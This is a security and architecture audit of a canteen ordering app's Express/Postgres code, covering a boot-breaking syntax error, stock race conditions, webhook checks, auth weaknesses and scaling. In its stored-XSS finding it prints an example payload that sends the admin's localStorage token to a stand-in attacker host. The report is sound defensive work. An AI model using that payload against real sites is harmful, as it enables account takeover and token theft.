# SRI CUMIN SEEDS CATERING SERVICES — Code & Architecture Audit
**Scope:** `kitcbecanteen-main` (as uploaded) vs. `project_plan.md`
**Target load:** ~5,000 registered users
**Focus:** crash risk, payment security, backend correctness, scalability

---

## 0. Bottom line up front

The app **will not start**. `backend/server.js` has a fatal syntax error (confirmed with `node --check`), so on Render it will crash-loop on every deploy. Beyond that, there's a real, exploitable **stored XSS that steals the admin's login token**, a **race condition that lets stock be oversold** under concurrent orders, and two **parallel/half-migrated payment integrations** (Zoho Payments + a leftover "UPI Gateway/Paytm" flow) that don't agree with each other. None of this is exotic — it's fixable in a few focused passes — but as shipped, it is not production-safe for 5,000 students hitting it at lunch rush.

Also worth flagging: your `project_plan.md` describes the payment system as a generic **"UPI Gateway"** with a webhook, but the actual code integrates **Zoho Payments** (`payments.zoho.in`) as the live path, with the UPI/Paytm gateway code left in as dead, half-broken fallback routes. The plan document is out of date relative to the code.

---

## 1. CRITICAL — Server won't boot

**File:** `backend/server.js`
**Line:** 346

```js
const resetLink = `${req.protocol}:// --- req.get('host')}/reset-password.html?token=${resetToken ---
```

This is a corrupted template literal — it looks like stray Markdown (`---`) got pasted into the code and the string/backtick was never closed. Running `node --check backend/server.js` fails immediately:

```
backend/server.js:347
        try {
        ^^^
SyntaxError: Unexpected token 'try'
```

**Impact:** The process cannot start at all. Every deploy on Render fails; nothing in the app works, not just forgot-password.

**Fix — replace line 346 with:**
```js
const resetLink = `${req.protocol}://${req.get('host')}/reset-password.html?token=${resetToken}`;
```

This must be fixed before anything else in this report matters.

---

## 2. Security audit

### 2.1 Payment system

| # | Issue | File / Line | Severity |
|---|---|---|---|
| 2.1.1 | **Race condition / oversell**: stock is checked with a `SELECT`, then decremented with a separate `UPDATE`, with an `await`/DB round-trip in between (Zoho session creation) before the order is even inserted. Two students hitting "checkout" on the last unit at the same moment can both pass the stock check. | `server.js` 486–572 (`/api/orders/create`), and again in the socket handler `server.js` 62–94 | **High** |
| 2.1.2 | **No DB transaction around checkout.** Order creation does: create Zoho payment session → insert order row → decrement stock, as three separate un-transacted steps. If the process crashes or a query fails between steps, you can end up with a Zoho session that charges money with no matching order, or stock decremented with no order recorded. | `server.js` 521–567 | **High** |
| 2.1.3 | **Stored XSS in the admin dashboard → admin token theft.** A user's `name` (fully attacker-controlled at registration, no sanitization, no length/charset limit) is rendered with raw `innerHTML` into the admin order board: `${order.user_name}`. A student can register as `<img src=x onerror="fetch('https://evil.example/x?t='+localStorage.token)">` and the admin's JWT (which grants full order/menu control, including "confirm payment" and stats) is exfiltrated the moment an admin opens the orders screen. | `frontend/js/admin.js` line 223 (also `name`/item fields at lines 47, 51, 88, 114, 190, 220 in various JS files use the same unescaped pattern) | **Critical** |
| 2.1.4 | **Two live payment integrations coexist and disagree.** `orders` table still carries `paytm_order_id`/`paytm_payment_id` columns and a full `/api/payment-callback` + `confirmOrder()` flow for a generic "UPI Gateway" (`process.env.UPI_GATEWAY_URL`, `UPI_GATEWAY_KEY`), while the actual checkout path in `app.js` only ever calls the **Zoho** flow. The UPI/Paytm code is dead but still deployed, reachable, and will throw if hit with those env vars unset. It's unclear which system is authoritative for reconciliation. | `server.js` 690–799 | **Medium** (confusion/attack surface, not currently reachable from the UI) |
| 2.1.5 | **`transactions` table is created but never written to.** It looks like it was meant to give webhook idempotency / an audit trail of payments, but no code ever `INSERT`s into it. Idempotency currently relies solely on checking `order.status !== 'Pending Payment'`, which works, but you have no immutable transaction log to reconcile against Zoho if a dispute happens. | `database.js` 127–135 | **Medium** |
| 2.1.6 | **Webhook signature check is correctly implemented** (HMAC-SHA256 over `timestamp.rawBody`, `timingSafeEqual`) — this is genuinely good and worth keeping — **but it's optional**: if `ZOHO_SIGNING_KEY` is unset, verification is skipped entirely and the webhook trusts whatever POSTs to it. Make it fail closed instead of open. | `server.js` 583 (`if (signingKey) {...}`) | **High** |
| 2.1.7 | **Manual "confirm payment" trusts the admin blindly** — reasonable given it's admin-gated, but there is no audit log (who confirmed, when, from what IP) beyond a `console.log`, so a compromised admin account (see 2.1.3) can mark any order paid with no record. | `server.js` 802–833 | **Medium** |
| 2.1.8 | `total` sent by the client is **not trusted** for the charge — the server recomputes `serverTotal` from DB prices. Good — this prevents client-side price tampering. | `server.js` 489–513 | ✅ Good practice, no action needed |

### 2.2 Authentication & session

| # | Issue | File / Line | Severity |
|---|---|---|---|
| 2.2.1 | **Hardcoded JWT secret fallback**: `process.env.JWT_SECRET \|\| 'supersecret_canteen_key'`. If the env var is ever unset (e.g. a misconfigured Render deploy), every token on the system is forgeable by anyone who reads the public GitHub repo. | `server.js` 21 | **Critical** |
| 2.2.2 | **No rate limiting anywhere** — login, OTP send, register, and forgot-password are all wide open. A 6-digit OTP with no attempt throttling is brute-forceable well inside its 5-minute window with a basic script; login is brute-forceable for weak passwords. | whole file, no `express-rate-limit` or equivalent | **High** |
| 2.2.3 | **OTP store is an unbounded in-memory `Map`**, never pruned. Every send-otp call that isn't completed (abandoned signups, bots) leaks memory permanently until restart. At scale/over time this is both a memory leak and, combined with 2.2.2, a spam vector. | `server.js` 195, 205 | **Medium** |
| 2.2.4 | **Default seeded admin account** — `admin@canteen.com` / `admin123` — is created automatically whenever no admin exists, and logged in plaintext to server logs. If the operator forgets to change it post-deploy, it's a public, guessable superuser account. | `database.js` 149–158 | **High** |
| 2.2.5 | JWTs are long-lived (7 days) with **no revocation/logout mechanism** server-side — "logout" just clears `localStorage`. A stolen token (see 2.1.3) stays valid for a week regardless. | `server.js` 264, 279, 306, 320; `auth.js` 143 | **Medium** |
| 2.2.6 | Tokens are stored in `localStorage`, which is directly readable by any injected script — this is what makes the XSS in 2.1.3 turn into full account/admin takeover rather than a cosmetic bug. Consider httpOnly cookies if you invest in fixing the XSS properly. | `frontend/js/auth.js`, `app.js`, `admin.js` | **Medium** (compounding factor of 2.1.3) |
| 2.2.7 | Password reset flow uses a cryptographically strong random token (`crypto.randomBytes(32)`) with 1-hour expiry — that part is solid. It's just unreachable today because of the Section 1 crash. | `server.js` 339–340 | ✅ Good practice |

### 2.3 Transport / infra hardening

- `cors()` is called with no origin restriction (`app.use(cors())` → allows `*`), and Socket.io is configured with `cors: { origin: '*' }`. Since auth is bearer-token (not cookies), this is lower-risk than it looks, but it should still be pinned to your real frontend origin(s) once you're off `localhost`. — `server.js` 19, 164
- No `helmet` (or equivalent) — no `X-Content-Type-Options`, `X-Frame-Options`/frame-ancestors, HSTS, etc.
- No request size limits configured on `express.json()` beyond defaults — fine for now, but worth capping explicitly given `/api/orders/create` accepts an arbitrary-length `items` array.
- No input validation library (`zod`/`express-validator`/etc.) anywhere — e.g. `POST/PUT /api/items` trusts `price`/`stock` from the request body with no check that they're non-negative numbers; a compromised or careless admin session can set negative prices or stock.

---

## 3. Correctness bugs (non-security)

| # | Issue | File / Line |
|---|---|---|
| 3.1 | Same broken template literal as Section 1 — listed again because it also breaks the **entire forgot-password feature** even after a hot-fix restores boot. | `server.js` 346 |
| 3.2 | `syncOrderIfPending`'s "failed" branch parses `order.items` (`JSON.parse(order.items)`) but the variable `items` is declared and never used after — dead code, harmless but confusing during maintenance. | `server.js` 896 |
| 3.3 | `cleanupDailyOrders()` deletes **all** orders (any status) from before today, including ones still `Pending Payment`/`Pending`/unfulfilled from a shift that ran past midnight. If a student orders at 11:58pm and picks up at 12:05am, their order can vanish from `orders.html` mid-transaction. | `server.js` 1018–1031 |
| 3.4 | `confirmOrder()` and the manual admin confirm route use `NOW()` (Postgres-specific SQL function) for `paid_at`, while the webhook path a few lines above uses `CURRENT_TIMESTAMP`. Both work on Postgres, but it's an inconsistency that will bite if you ever need to support SQLite again (the `database.js` shim's naming — `isPostgres: true` hardcoded — suggests SQLite support was dropped mid-project). | `server.js` 786, 818 vs. 645 |
| 3.5 | `db.run`'s `.then()`/`.catch()` never rejects into an `else` — if `pool.query` throws before returning a promise (e.g. bad SQL), you get `(err) => { if (callback) callback(err); }`, fine, but several call sites do `function (err, info) { ... this?.changes }` — `this` inside an arrow-adjacent regular function passed to `db.run` is `undefined` in this shim (it's not `sqlite3`'s `this`), so `this?.changes` always evaluates via the `info?.changes` fallback. It works today only because of the `??` fallback chain — remove `info?.changes ?? this?.changes` patterns down to just `info?.changes` for clarity, since `this` will never be populated by this driver. | `server.js` 956, 964, 1027, etc. |
| 3.6 | `/api/items/stats` loads **every row in `orders`** into Node and loops in JS to aggregate. Given the daily cleanup job, this table stays small day-to-day, so it's fine now — but if the cleanup job is ever disabled or fails silently (see 3.3's fragility), this becomes an O(n) full-table scan on every admin stats page load. | `server.js` 984–1015 |

---

## 4. Scalability assessment — will it hold 5,000 users?

**Short answer: not as configured, mainly because of in-memory state and missing throttles — not because of raw traffic volume.** 5,000 registered users placing lunchtime orders is not a large workload for Postgres/Express; the risks below are about correctness under concurrency and single-instance fragility, not raw capacity.

1. **All session/cart state lives in process memory** (`activeCarts`, `activeConnections`, `disconnectTimeouts`, `otps`). This means:
   - You can never run more than **one server instance**. Render's free/starter tiers are single-instance by default, but if you ever scale to 2+ instances for reliability, carts and OTPs will randomly desync depending on which instance a request lands on.
   - A server restart (deploy, crash, Render free-tier spin-down after idle) **silently drops every active cart** and any in-flight OTP.
   - Render's **free plan spins the service down after inactivity**; the next request pays a cold-start penalty (worse during lunch rush if it went idle mid-morning) and a Postgres connection needs to re-establish.
2. **No Socket.io Redis adapter / sticky sessions** — confirms point 1; horizontal scaling isn't possible without one.
3. **`pg.Pool` uses default settings** (no `max`, no `idleTimeoutMillis`, no `statement_timeout` configured) — default pool size is 10 connections. Under a lunch-rush burst of concurrent checkouts (each doing 3–4 sequential queries: stock check, Zoho call, insert, stock update), 10 connections will queue up quickly. This is an easy, high-value fix (see recommendations).
4. **The stock race condition (2.1.1)** is actually a bigger real-world risk at 5,000 users than raw load is — a popular item selling out is exactly when concurrent orders spike, which is exactly when the check-then-act gap gets exercised.
5. **Daily order cleanup keeps the `orders` table small**, which is good — it means `/api/orders`, `/api/orders/me`, and `/api/items/stats` (all unbounded `SELECT *`, no pagination) stay cheap in practice. Just be aware this "works" *because* of the cleanup job, not because those endpoints are actually bounded — if you ever need historical order data (for real sales analytics across days), this design deletes it daily and the unindexed unbounded queries will need revisiting together.
6. **No caching for `/api/items`** (menu reads) — every page load hits Postgres directly. Fine at 5,000 users, but a 30–60s in-memory cache (invalidated on the existing `menu_updated` socket event, which you already emit) would cut DB load for free.
7. **OTP map leak (2.2.3)** becomes a slow, unbounded memory-growth risk specifically at higher user counts/over a long-running semester without restarts.

**Verdict:** the architecture doesn't need a rewrite for 5,000 users — Express + Postgres + Socket.io is a reasonable fit. It needs: (a) the stock race fixed with a transaction, (b) pool tuning, (c) rate limiting, and (d) acceptance that it's single-instance-only until cart/session state is moved to Postgres or Redis.

---

## 5. File-by-file fix list

### `backend/server.js`

| Line | Current | Change to |
|---|---|---|
| 21 | `const JWT_SECRET = process.env.JWT_SECRET \|\| 'supersecret_canteen_key';` | Remove the fallback; throw on boot if unset, same pattern as `database.js` line 5–7: `if (!process.env.JWT_SECRET) throw new Error('JWT_SECRET is required.'); const JWT_SECRET = process.env.JWT_SECRET;` |
| 346 | `` const resetLink = `${req.protocol}:// --- req.get('host')}/reset-password.html?token=${resetToken --- `` | `` const resetLink = `${req.protocol}://${req.get('host')}/reset-password.html?token=${resetToken}`; `` |
| 486–572 | Stock check (`SELECT`) then later `UPDATE items SET stock = stock - ?` as separate statements | Wrap in a single transaction and make the decrement conditional+atomic: `UPDATE items SET stock = stock - $1 WHERE id = $2 AND stock >= $1` (check `rowCount === 0` → insufficient stock, abort transaction). Do this **before** calling Zoho, and only create the payment session once stock is reserved. |
| 583 | `if (signingKey) { ...verify... }` (verification skipped when unset) | `if (!signingKey) { console.error('ZOHO_SIGNING_KEY not set — refusing webhook'); return res.status(500).json({ error: 'Webhook not configured' }); }` then always verify. |
| 690–799 | Dead `/api/payment-callback` + `confirmOrder()` UPI/Paytm flow, unreachable from current frontend | Either remove entirely, or clearly document it as the legacy path and gate it behind a feature flag so it can't be hit accidentally in production. |
| 962 (route around `DELETE /api/orders/delivered`), 1018–1031 | `cleanupDailyOrders` deletes by date regardless of status | Add `AND status IN ('Delivered','Failed')` (or similar) so anything still `Pending`/`Pending Payment` at midnight survives until it's actually resolved. |

### `backend/database.js`

| Line | Current | Change to |
|---|---|---|
| 9–12 | `new Pool({ connectionString, ssl })` with no pool sizing | `new Pool({ connectionString, ssl, max: 20, idleTimeoutMillis: 30000, connectionTimeoutMillis: 5000, statement_timeout: 10000 })` — tune `max` to what your Postgres plan allows. |
| 149–158 | Seeds `admin@canteen.com` / `admin123` unconditionally when no admin exists | Read the initial admin email/password from env vars (`ADMIN_EMAIL`, `ADMIN_PASSWORD`) with the hardcoded values only as a *local dev* fallback (guard with `NODE_ENV !== 'production'`), and force a password change flow on first admin login. |
| 127–135 | `transactions` table created, never used | Either insert a row here on every successful webhook/confirm-payment event (recommended — gives you a real audit trail to reconcile against Zoho), or drop the table if it's genuinely not planned. |

### `frontend/js/admin.js`

| Line | Current | Change to |
|---|---|---|
| 223 | `` <div ...>${order.user_name}</div> `` inside `div.innerHTML = \`...\`` | Escape user-controlled text before interpolating, e.g. add a small helper: `const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));` and use `${esc(order.user_name)}`. Apply the same treatment to `order.id`, `i.name`, and anything else pulled from user/admin-entered data before it goes into `innerHTML` (lines 47, 88, 114, 190, 220 in `admin-menu.js`/`app.js`/`admin.js` follow the same pattern). Longer-term: build these nodes with `textContent` for the untrusted fields instead of template-literal `innerHTML`. |

### `backend/server.js` (registration input)

| Line | Current | Change to |
|---|---|---|
| 231–233 | `name` accepted from `req.body` with no length/charset limit | Add a basic constraint (e.g. trim, cap at ~60 chars, reject `<`/`>` or run through the same escape function server-side) so the stored XSS payload in 2.1.3 can't be created in the first place — this is the actual root fix; the frontend escaping above is defense-in-depth. |

---

## 6. Prioritized action plan

1. **Fix the syntax error (Section 1)** — nothing else matters until the server can boot.
2. **Fix the admin-panel stored XSS (2.1.3)** — this is the single highest-impact security issue; it's a full admin account takeover for the cost of a registration form.
3. **Remove the hardcoded JWT secret fallback (2.2.1)** and rotate `JWT_SECRET` on deploy.
4. **Make the checkout stock decrement atomic (2.1.1 / 2.1.2)** — wrap in a Postgres transaction with a conditional `UPDATE ... WHERE stock >= ?`.
5. **Make webhook signature verification mandatory (2.1.6)**.
6. **Add rate limiting** (`express-rate-limit` is the path of least resistance) to `/api/auth/send-otp`, `/api/auth/register`, `/api/auth/login`, `/api/auth/forgot-password`.
7. **Change the default admin seed** to use env vars, not a hardcoded printed password.
8. **Tune the Postgres pool** (`max`, timeouts) before load-testing.
9. Clean up the dead Paytm/UPI-Gateway code path, or explicitly document why it's kept.
10. Prune the OTP map on read (delete expired entries opportunistically) and consider moving cart/OTP state to Postgres or Redis if you ever plan multi-instance deployment.

Items 1–5 are the ones I'd genuinely block a production launch on for 5,000 real users handling real payments. 6–10 matter but are unlikely to cause an incident this week.
